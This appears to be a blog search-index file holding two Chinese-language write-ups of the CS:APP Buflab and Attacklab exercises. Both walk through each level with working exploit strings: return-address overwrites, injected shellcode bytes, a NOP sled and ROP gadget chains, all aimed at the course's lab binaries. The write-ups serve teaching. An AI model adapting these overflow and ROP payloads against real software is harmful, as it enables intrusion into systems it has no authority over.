<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title>csapp-Buflab</title>
      <link href="/2019/01/15/csapp-Buflab/"/>
      <url>/2019/01/15/csapp-Buflab/</url>
      
        <content type="html"><![CDATA[<h2 id="序"><a href="#序" class="headerlink" title="序"></a>序</h2><p>　　这是csapp系列的第四篇文章了。具体题目请见<a href="http://csapp.cs.cmu.edu/3e/labs.html" target="_blank" rel="noopener">官网</a>。本文主要讲csapp中的buflab的部分流程和心得。如果有什么写得不好的地方，欢迎联系我修改(右下角小图标点开即可对话)。<br>　　本文建立在csapp完成了attacklab的基础上。如果还没完成上一个实验，请先将其完成再进行本实验。不过个人觉得上一个实验能够独立完成的话，这个实验难度就真的很小了。同样的，还是很建议先把官方给的<a href="http://csapp.cs.cmu.edu/3e/buflab32.pdf" target="_blank" rel="noopener">资料</a>看了之后再来做这个实验。不过笔者这边电脑看的时候有一些乱码，不知道其他电脑会不会一样。</p><h2 id="buflab-实验要求"><a href="#buflab-实验要求" class="headerlink" title="buflab 实验要求"></a>buflab 实验要求</h2><p>　　这个实验要求我们使用缓冲区溢出漏洞对bufbomb进行攻击。总共5个关卡。</p><blockquote><p>实验文件<br>bufbomb：我们需要攻击的对象<br>hex2raw：帮助我们成功攻击字符串的文件<br>makecookie：根据用户id产生对应的cookie (./makecookie [userid] 即可生成, 注意将[userid]替换成自己喜欢的字符串)<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> val;</span><br><span class="line">  val = getbuf();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"No exploit. Getbuf returned 0x%x\n"</span>, val);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="title">getbuf</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[BUFFER_SIZE];</span><br><span class="line">  Gets(buf);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p></blockquote><h2 id="buflab-的一些注意点"><a href="#buflab-的一些注意点" class="headerlink" title="buflab 的一些注意点"></a>buflab 的一些注意点</h2><p>　　首先，本实验和上一个实验相比的话，难度还是要小了很多的。基本上除了最后一个level之外都没什么难度。但有一些不一样的细节需要注意<br>　　1. bufbomb在编译的时候加上了 -m32 参数，意味着无论你的电脑是否是64位系统，编译器遵循的都是IA-32规则。也就是说，我们需要用到的函数地址，指针等都是32位，这点和上一个实验不同，需要很小心。<br>　　2. 本实验中参数的传递比较接近RISC，参数是放在栈当中进行传递的，而不是放在%rdi,%rsi这样的寄存器上。所以建议完成本实验时，还是要多画图，结合图像来看的话要简单易懂很多。<br>　　3. 本实验和上一个实验基本上的架构是很相似的，我们需要做的事情也差不多，因此一些做法可以借鉴上一个实验中的相关关卡。</p><h3 id="level-0"><a href="#level-0" class="headerlink" title="level 0"></a>level 0</h3><p>　　首先，我们还是一样，先用objdump反编译，得到bufbomb.txt文件，便于查看。前面四道题中，都调用到了这样的函数：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NORMAL_BUFFER_SIZE 32</span></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="title">getbuf</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[NORMAL_BUFFER_SIZE];</span><br><span class="line">  Gets(buf);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>　　可以看到，和上一个实验基本没有区别。对于第一题来说，我们需要成功进入smoke()函数，只需将要丢弃的一大段字节随便填充上去，最后overwrite返回的地址即可。注意，这里的地址只有四个字节。答案就不贴了。</p><h3 id="level-1"><a href="#level-1" class="headerlink" title="level 1"></a>level 1</h3><p>　　这道题需要我们val这个数值传入fizz()函数，并且val等于我们的cookie。很简单，注意到这道题中传递参数是用栈来实现的，我们只要把cookie放在栈上即可，连代码注入都不需要。但一定要很小心字节的顺序，在这种问题上卡住还是很吃亏的。答案如下(其中60可以随意替换成其他值)：</p><blockquote><p>60 60 60 60 60 60 60 60<br>60 60 60 60 60 60 60 60<br>60 60 60 60 60 60 60 60<br>60 60 60 60 60 60 60 60<br>60 60 60 60 60 60 60 60<br>60 60 60 60 42 8c 04 08 // 跳转到fizz函数入口<br>60 60 60 60 c0 e5 c4 53 // 此行为cookie，注意前面的四个字节不能省掉</p></blockquote><h3 id="level-2"><a href="#level-2" class="headerlink" title="level 2"></a>level 2</h3><p>　　对于这道题，我们需要修改一个全局变量global_value的值，使其等于cookie。这道题就需要用到代码注入了。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov $<span class="number">0x53c4e5c0</span>,%eax <span class="comment">// 左侧的值为cookie，我们先将其移动到%eax</span></span><br><span class="line">mov %eax,<span class="number">0x804d100</span>   <span class="comment">// 放入global_value所在的内存单元(这里的地址可以直接看反汇编文件得到)</span></span><br><span class="line">ret</span><br></pre></td></tr></table></figure></p><p>　　将上面的汇编代码编译，并反编译之后，我们就得到了它对应的机器级表示。在放进我们的文件(这里是bufbomb3.txt)当中，使用cat bufbomb3.txt | ./hex2raw | ./bufbomb -u [userid] 命令即可。我的bufbomb.3txt文件内容为：</p><blockquote><p>60 60 60 60 60 60 60 60<br>b8 c0 e5 c4 53 a3 00 d1<br>04 08 c3 60 60 60 60 60<br>60 60 60 60 60 60 60 60<br>60 60 60 60 60 60 60 60<br>60 60 60 60 00 39 68 55<br>9d 8c 04 08</p></blockquote><h3 id="level-3"><a href="#level-3" class="headerlink" title="level 3"></a>level 3</h3><p>　　这道题开始有一定的难度了。本题目要求我们使用代码注入并且不能破坏原有的栈数据，最后使得getbuf函数返回cookie。有比较多的细节需要我们去注意。<br>　　首先，我们需要想到，怎样才不会破坏原有的栈数据呢？首先，我们不能覆盖到return address再往上的数据，也就是说，我们输入的字符串长度不能超过48，否则原有的某些数据可能会被我们覆盖。其次，在bufbomb的反汇编文件中，getbuf有<b>push %ebp</b>这样的指令将%ebp保存在栈上，而当我们覆盖了return address后，显然这个数据就丢失了。那怎么办？注意到这道题目中栈的位置不会发生改变。我们可以用gdb调试，在这个函数打一个断点，然后打印出放在栈上的这个值。到时在注入代码的时候记得把这个值放到%ebp即可。<br>　　为了能够顺利地回到test函数中，我们还要查看一下test函数在call getbuf后的下一个指令的位置，在我们的代码中要将PC更改为这个值，这样程序看起来就像是从getbuf当中返回了。<br>　　因此，我们可以得到答案：</p><blockquote><p>60 60 60 60 60 60 60 60<br>b8 c0 e5 c4 53 68 be 8d  // 将cookie放到%eax, 并把test中的下一个指令位置push进栈<br>04 08 c3 60 60 60 60 60<br>60 60 60 60 60 60 60 60<br>60 60 60 60 60 60 60 60<br>50 39 68 55 00 39 68 55  // 后面四个字节跳转到我们注入了代码的地址，前面四个字节对应着%ebp的值，pop的时候就会被放回%ebp了</p></blockquote><h3 id="level-4"><a href="#level-4" class="headerlink" title="level 4"></a>level 4</h3><p>　　不得不说，这道题当纯看题目要求时，觉得还是很变态的。首先，我们需要做到level3中的所有要求。其次，getbuf会被调用5次，我们需要每一次都能满足要求。并且，比较难的一点是，每一次getbuf的时候，stack的%esp(%ebp)指针的位置是不确定的，这也就意味着，我们没办法精确地跳转到我们注入的代码的位置。当然，如果还有印象的话，书中有提到对付ASLR的一种办法，就是使用nop指令，nop即no operation，CPU不会进行任何操作，相当与直接跳过这个指令。我们可以在注入的代码前面加入大量的nop，这样的话只要能够跳转到任意一个nop指令，PC就会像滑雪橇一样滑到我们注入的代码。我们只需要在最后的几行实现保存即可。<br>　　要保证栈不被破坏，我们在注入的代码中还需要做到以下几点：<br>　　1. 找到%ebp对应的值，并将其写入其中。<br>　　2. 将cookie放入%eax中，作为返回值<br>　　3. 注入代码的末尾需要将testn中的下一条指令push进栈当中，这样才能顺利返回到testn。同时，整个代码的总字符数必须为528，多了就溢出，栈被破坏，少了的话没办法覆盖掉return address。<br>　　其中2和3和上一个level没有区别，最主要是第一个，既然%ebp已经被覆盖了，我们要怎么知道它原先的值是多少呢？其实，我们可以从反汇编文件得到答案。%ebp其实就是testn的堆栈帧，我们看testn函数，它在push操作后，将%esp赋值给了%ebp，然后自己减掉了0x24，也就是说，call getbuf刚进入时，%esp + 0x24 + 4 = %ebp， 通过画图像，我们就可以很容易得到相关的规律了。小心push的时候%esp会-4。<br>　　以下是我的答案：</p><blockquote><p>90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90<br>90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90<br>90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90<br>90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90<br>90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90<br>90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90<br>90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90<br>90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90<br>90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90<br>90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90<br>90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90<br>90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90<br>90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90<br>90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90<br>90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90<br>90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90<br>90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90<br>90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90<br>90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90<br>90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90<br>90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90<br>90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90<br>90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90<br>90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90<br>90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90<br>90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90<br>90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90<br>90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90<br>90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90<br>90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90<br>90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90<br>90 90 90 90 90 90 90 90 90 b8 c0 e5 c4 53 68 3a<br>8e 04 08 8d 6c 24 2c c3 90 90 90 90 00 38 68 55</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> csapp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> csapp </tag>
            
            <tag> overflow </tag>
            
            <tag> assembly </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>csapp-Attacklab</title>
      <link href="/2019/01/15/csapp-Attacklab/"/>
      <url>/2019/01/15/csapp-Attacklab/</url>
      
        <content type="html"><![CDATA[<h2 id="序"><a href="#序" class="headerlink" title="序"></a>序</h2><p>　　这是csapp系列的第三篇文章。具体题目请见<a href="http://csapp.cs.cmu.edu/3e/labs.html" target="_blank" rel="noopener">官网</a>。本文主要讲csapp中的attacklab的流程和心得。如果有什么写得不好的地方，欢迎联系我修改(右下角小图标点开即可对话)。<br>　　个人觉得这个实验比起前面两个还是要稍微简单一点的，但是强烈建议把官网给的<a href="http://csapp.cs.cmu.edu/3e/bomblab.pdf" target="_blank" rel="noopener">资料</a>看一下，看完相信对完成这个实验还是有很大帮助的。整个实验主要是一开始无从下手以及最后一个level比较麻烦，但结合资料的相关提示的话，做起来难度还是不大的，建议尝试着不看任何其他教程自己独立完成。</p><h2 id="attacklab-实验要求"><a href="#attacklab-实验要求" class="headerlink" title="attacklab 实验要求"></a>attacklab 实验要求</h2><p>　　这个实验要求我们使用缓冲区溢出对ctarget和rtarget进行攻击。总共有五个关卡，其中，前三个要求使用代码注入(code injection)对ctarget进行攻击，后面两个要求使用return-oriented programming(ROP)对rtarget进行攻击。</p><blockquote><p>实验文件：<br>ctarget 和 rtarget：我们需要攻击的对象。<br>hex2raw：帮助我们用来生成攻击字符串的文件。<br>cookie: 识别文件，用来区分不同的用户(一般拿到的值是一个随机的8位16进制数)<br>farm.c：用于提供gadget，与后面两个关卡有关。</p></blockquote><blockquote><p>实验目的：<br>熟练掌握gdb和objdump的相关功能<br>加深对缓冲区溢出现象的理解，以及懂得如何简单地对某个程序进行缓冲区溢出攻击<br>了解x86-64的一些指令的编码等</p></blockquote><h2 id="target-文件的一些注意点"><a href="#target-文件的一些注意点" class="headerlink" title="target 文件的一些注意点"></a>target 文件的一些注意点</h2><p>　　无论是rtarget还是ctarget两个文件都有相似的构造。两个文件都包含有下面的函数。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> val;</span><br><span class="line">  val = getbuf();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"No exploit. Getbuf returned 0x%x\n"</span>, val);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="title">getbuf</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[BUFFER_SIZE];</span><br><span class="line">  Gets(buf);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>　　其中，BUFFER_SIZE是宏定义，我们暂时不知道是多少，然后Gets()函数和gets()函数的功能基本相同。很明显，一旦我们输入的字符串比较长的时候，这就会产生缓冲区溢出的现象。因此，我们需要利用这一点，对该程序进行攻击。具体其他很多函数的细节，其实可以完全不去管。我们需要做的仅仅是生成一个特定的满足要求的字符串，通过overwrite栈上面的数据，使得getbuf函数无法顺利返回，并且，成功运行事先就存在于文件中的函数touchx()。<br>　　再次强调一下，所有需要了解的相关细节和知识点在官方资料中都有提到，本文基本上只是对该资料的部分内容进行翻译，以及提供一个完成该实验的思路，仅供参考。</p><h3 id="Part-I：level-1"><a href="#Part-I：level-1" class="headerlink" title="Part I：level 1"></a>Part I：level 1</h3><p>　　第一题比较简单，是让我们熟悉一下相关的一些操作。在正式开始实验以前，建议先使用objdump将rtarget和ctarget反编译，可以使用类似<b>objdump -d ctarget &gt; ctarget.txt </b>等命令将反编译文件写入txt中，便于查看。<br>　　我们先看一下getbuf中BUFFER_SIZE究竟是多少。查看ctarget.txt中的内容有以下几行：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000004017</span>a8 &lt;getbuf&gt;:</span><br><span class="line">  <span class="number">4017</span>a8:<span class="number">48</span> <span class="number">83</span> ec <span class="number">28</span>          sub    $<span class="number">0x28</span>,%rsp</span><br><span class="line">  <span class="number">4017</span>ac:<span class="number">48</span> <span class="number">89</span> e7             mov    %rsp,%rdi</span><br><span class="line">  <span class="number">4017</span>af:e8 <span class="number">8</span>c <span class="number">02</span> <span class="number">00</span> <span class="number">00</span>       callq  <span class="number">401</span>a40 &lt;Gets&gt;</span><br><span class="line">  <span class="number">4017b</span>4:b8 <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       mov    $<span class="number">0x1</span>,%eax</span><br><span class="line">  <span class="number">4017b</span>9:<span class="number">48</span> <span class="number">83</span> c4 <span class="number">28</span>          add    $<span class="number">0x28</span>,%rsp</span><br><span class="line">  <span class="number">4017b</span>d:c3                   retq   </span><br><span class="line">  <span class="number">4017b</span>e:<span class="number">90</span>                   nop</span><br><span class="line">  <span class="number">4017b</span>f:<span class="number">90</span>                   nop</span><br></pre></td></tr></table></figure></p><p>　　由上图，我们可以看到，BUFFER_SIZE应该是一个小于40(0x28)的数字。%rsp+0x28上存放的地址就是函数正确返回的时候，PC需要指向的地址。这也是我们需要overwrite的地方。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">touch1</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  vlevel = <span class="number">1</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Touch1!: You called touch1()\n"</span>);</span><br><span class="line">  validate(<span class="number">1</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>　　如上图，touch1不需要我们传入任何参数，因此我们只需要将返回地址覆盖为touch1的入口地址即可。注意这里是采用小端法。<br>　　注意到，一个函数返回时，对应的汇编语句为 <b>ret</b>，这个时候程序会取出位于栈顶的8个字节的数据，并将其弹出，最后再将PC(program counter)更改为从栈顶取出的那个数据，本质上这其实就是一个control transfer的过程，将控制权从一个函数转移到另一个函数。答案可以为：</p><blockquote><p>61 61 61 61 61<br>61 61 61 61 61<br>61 61 61 61 61<br>61 61 61 61 61<br>61 61 61 61 61<br>61 61 61 61 61<br>61 61 61 61 61<br>61 61 61 61 61<br>c0 17 40 00 00 00 00 00 /* 这一行即为touch1的入口地址。前面的40个字节在函数返回时相当与丢失了。 */</p></blockquote><p>　　将上图中的编码存在某个文件中(这里我存在ctarget1.txt中)，然后使用如下指令即可(注意ctarget和hex2raw应该在当前目录下)：</p><blockquote><p>cat ctarget1.txt | ./hex2raw | ./ctarget -q</p></blockquote><h3 id="Part-I：-level-2"><a href="#Part-I：-level-2" class="headerlink" title="Part I： level 2"></a>Part I： level 2</h3><p>　　有了上一题的基础，我们对实验稍微熟悉一些了。接下来的我们需要进入touch2函数了。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">touch2</span><span class="params">(<span class="keyword">unsigned</span> value)</span> </span>&#123;</span><br><span class="line">  vlevel = <span class="number">2</span>;</span><br><span class="line">  <span class="keyword">if</span> (val == cookie) &#123;</span><br><span class="line">    ...</span><br><span class="line">    validate(<span class="number">2</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    ...</span><br><span class="line">    fail(<span class="number">2</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>　　这个函数需要我们传入一个参数，同时这个参数还要和cookie相等(还记得实验文件中有一个cookie吗？这个cookie就是就是那个文件里面的数字的值)。 由于需要传入参数，没那么好处理了。这个时候我们就需要注入自己的代码了。<br>　　我们需要实现这样的一个指令：</p><blockquote><p>mov $cookie, %rdi // cookie为和每个用户对应的那个数字<br>ret</p></blockquote><p>　　为了获取这个指令的机器级表示，我们可以用gcc将其编译成obj，再用objdump反编译，可以得到对应的机器码。然后，再将其写入txt文件中即可。这里，我的答案是：</p><blockquote><p>bf fa 97 b9 59 /* Set %rdi to cookie*/<br>c3 60 60 60 60 /* transfer control to touch2 */<br>60 60 60 60 60<br>60 60 60 60 60<br>60 60 60 60 60<br>60 60 60 60 60<br>60 60 60 60 60<br>60 60 60 60 60<br>78 dc 61 55 00 00 00 00<br>ec 17 40 00 00 00 00 00</p></blockquote><p>　　%rsp+028并且函数返回之后，PC将指向0x5561dc78，在这里即为bf字节对应的地址。顺利执行完mov语句后，执行c3(ret指令)，PC将指向0x4017ec，这里即为函数touch2的入口地址。继续，使用类似上面的命令将攻击字符串导入，第二题顺利解决。</p><h3 id="Part-I：-level-3"><a href="#Part-I：-level-3" class="headerlink" title="Part I： level 3"></a>Part I： level 3</h3><p>　　和上一题类似，本题需要传入的是一个char指针，即将cookie的那串数字看成字符串。注意，0x不包含在这个字符串当中。同样的，我们可以使用类似上一题的方法，将我们需要的代码和cookie字符串(这里应该查询ASCII码，找到自己的那个串中每个字符对应的数字为多少)注入其中。<br>　　值得注意的是，本题有一个陷阱，当执行touch3的时候，touch3内部执行了hexmatch函数，这里会覆盖掉栈中我们注入的一些数据。但注意到栈是往下生长的，我们只要把cookie字符串放在上面即可。以下为我的答案：</p><blockquote><p>60 60 60 60 60<br>60 60 60 60 60<br>60 60 60 60 60<br>60 60 60 60 60<br>60 60 60 60 60<br>60 60 60 60 60<br>60 60 60 60 60<br>60 60 60 60 60<br>b0 dc 61 55 00 00 00 00　// 覆盖掉原先的返回地址，指向下方我们注入的那个函数<br>fa 18 40 00 00 00 00 00<br>48 c7 c7 c0 dc 61 55 c3  // 这一行将cookie的首地址mov到%rdi上，并返回<br>00 00 00 00 00 00 00 00<br>35 39 62 39 39 37 66 61　// 这一行为我的cookie值</p></blockquote><h3 id="Part-II：-level-2"><a href="#Part-II：-level-2" class="headerlink" title="Part II： level 2"></a>Part II： level 2</h3><p>　　这一道题开始，难度有点加大了。在rtarget文件中，采用了地址空间布局随机化，以及限制栈上的代码无法被执行等方式，使得我们无法采用代码注入对程序进行攻击。这个时候我们需要采用return-oriented programming（ROP）技术来攻击代码。具体如下图。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">setval_210</span><span class="params">(<span class="keyword">unsigned</span> \*p)</span> </span>&#123;</span><br><span class="line">  \*p = <span class="number">3347663060U</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>　　对于上面这个函数，我们看起来好像没有什么特别的。但倘若从机器码的角度来看呢？</p><blockquote><p>400f15: c7 07 d4 48 89 c7 movl $0xc78948d4, (%rdi)<br>400f1b: c3                retq</p></blockquote><p>　　好像还是没有什么特别的。但我们注意到，48，89，c7还可以被理解成另一种意思。如果这个函数是从400f18地址开始的，那么将变成：</p><blockquote><p>400f18: 48 89 c7 movq %rax, %rdi<br>400f1b: c3 retq</p></blockquote><p>　　整个程序的意思完全变了！这就是ROP的特点。利用别人自身的代码攻击别人。只要换了一个位置开始解读，整个程序的结果就会发生很大的变化。我们要做的正是利用这一点来攻击rtarget。为了方便我们的攻击，rtarget中含有很多类似上面这样的容易攻击的函数。从start_farm开始，到end_farm都是我们可以利用来攻击的gadget。<br>　　这个时候我们再来看一下题目的要求。我们需要使用ROP进入touch2中，并且传入正确的cookie。进入touch2还容易，可cookie怎么找？直接找源代码中有没有读应的字节序列吗？这不太可能。注意到还有这个代码popq，对应的编码为0x58~0x5f。怎么用呢？我们实现将cookie注入栈上，然后跳转到某个指令。popq将这个cookie取下，并放在某个寄存器中。然后在将其移动到%rdi。最后再跳转到touch2完成任务。<br>　　以下是我的答案：</p><blockquote><p>60 60 60 60 60<br>60 60 60 60 60<br>60 60 60 60 60<br>60 60 60 60 60<br>60 60 60 60 60<br>60 60 60 60 60<br>60 60 60 60 60<br>60 60 60 60 60<br>ab 19 40 00 00 00 00 00  // 跳转到0x4019ab，实现popq，将cookie取下<br>fa 97 b9 59 00 00 00 00  // 我自己的cookie<br>a2 19 40 00 00 00 00 00  // 跳转到0x4019a2，将cookie移动至%rdi<br>ec 17 40 00 00 00 00 00  // 跳转到0x4017ec，即touch2所在地址</p></blockquote><h3 id="Part-II：-level-3"><a href="#Part-II：-level-3" class="headerlink" title="Part II： level 3"></a>Part II： level 3</h3><p>　　这道题需要实现跳转到touch3中，并且传入char指针，指向我们的cookie字符串。明显有一定难度。官方资料中将我们可能需要用到的指令列出来。如下。<br><img src="/2019/01/15/csapp-Attacklab/1.png" alt="pic"><br>　　由官方所给的提示，我们知道答案应该主要是用mov指令来实现的。注意到mov指令均含有89这个数字，我们可以使用ctrl+f查找有可能被我们用到的gadget。再次，我找到的如下。左边为该实现该指令需要跳转向的地址。<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">4019</span>ab <span class="number">58</span>          pop %rax</span><br><span class="line">       <span class="number">90</span>          nop</span><br><span class="line">       c3          ret</span><br><span class="line"></span><br><span class="line"><span class="number">4019</span>a2 <span class="number">48</span> <span class="number">89</span> c7    mov %rax, %rdi</span><br><span class="line">       c3          ret</span><br><span class="line"></span><br><span class="line"><span class="number">4019</span>dd <span class="number">89</span> c2       mov %eax, %edx</span><br><span class="line">       <span class="number">90</span>          nop</span><br><span class="line">       c3          ret</span><br><span class="line"></span><br><span class="line"><span class="number">401</span>a06 <span class="number">48</span> <span class="number">89</span> e0    mov %rsp, %rax</span><br><span class="line">       c3          ret</span><br><span class="line"></span><br><span class="line"><span class="number">401</span>a69 <span class="number">89</span> d1       mov %edx, %ecx</span><br><span class="line">       <span class="number">08</span> db       orb %bl, %bl</span><br><span class="line">       c3          ret</span><br><span class="line"></span><br><span class="line"><span class="number">401</span>a42 <span class="number">89</span> c2       mov %eax, %edx</span><br><span class="line">       <span class="number">84</span> c0       testb %al, %al</span><br><span class="line">       c3          ret</span><br><span class="line"></span><br><span class="line"><span class="number">401</span>a27 <span class="number">89</span> ce       mov %ecx,%esi</span><br><span class="line">       <span class="number">38</span> c0       cmpb %al, %al</span><br><span class="line">       c3          ret</span><br></pre></td></tr></table></figure></p><p>　　我们如果直接将字符串放在栈当中，但我们又不知到位置，没办法得到对应的指针。因此我们想采用栈顶指针+偏移量的做法。一开始，笔者在这里卡了非常久，一直找不到比较好的办法来解决。直到我看见了farm中有这样一个函数：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">add_xy</span><span class="params">(<span class="keyword">long</span> x, <span class="keyword">long</span> y)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> x+y;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>　　所以答案，瞬间解决了。按顺序，总共8个gadget，每一个gadget对应的汇编代码如下(ret省去)：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mov %rsp, %rax</span><br><span class="line">mov %rax, %rdi</span><br><span class="line">pop %rax</span><br><span class="line">mov %eax, %edx</span><br><span class="line">mov %edx, %ecx</span><br><span class="line">mov %ecx, %esi</span><br><span class="line">leaq (%rdi, %rsi, <span class="number">1</span>) %rax</span><br><span class="line">mov %rax %rdi</span><br></pre></td></tr></table></figure></p><p>　　以下是我的答案：</p><blockquote><p>60 60 60 60 60<br>60 60 60 60 60<br>60 60 60 60 60<br>60 60 60 60 60<br>60 60 60 60 60<br>60 60 60 60 60<br>60 60 60 60 60<br>60 60 60 60 60<br>06 1a 40 00 00 00 00 00<br>a2 19 40 00 00 00 00 00<br>ab 19 40 00 00 00 00 00<br>48 00 00 00 00 00 00 00<br>dd 19 40 00 00 00 00 00<br>69 1a 40 00 00 00 00 00<br>27 1a 40 00 00 00 00 00<br>d6 19 40 00 00 00 00 00<br>a2 19 40 00 00 00 00 00<br>fa 18 40 00 00 00 00 00<br>35 39 62 39 39 37 66 61<br>00</p></blockquote><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>　　转眼间寒假已经过了好几天了。今天花了接近一天的时间完成了这个实验，以及写下这篇博客。总的来说，虽然做实验的过程很辛苦，但是做完感觉还是很舒服的。虽然我也不知到为什么想要把所有实验的过程都用博客记录下来(这么偏僻的地方应该也没有人会过来看吧)。可能是为了锻炼自己写报告的能力？？？好吧，我也不知道。还是希望自己好好加油，继续坚持写下去吧。这也才仅仅是第三篇而已，还有8篇呢。。<br>　　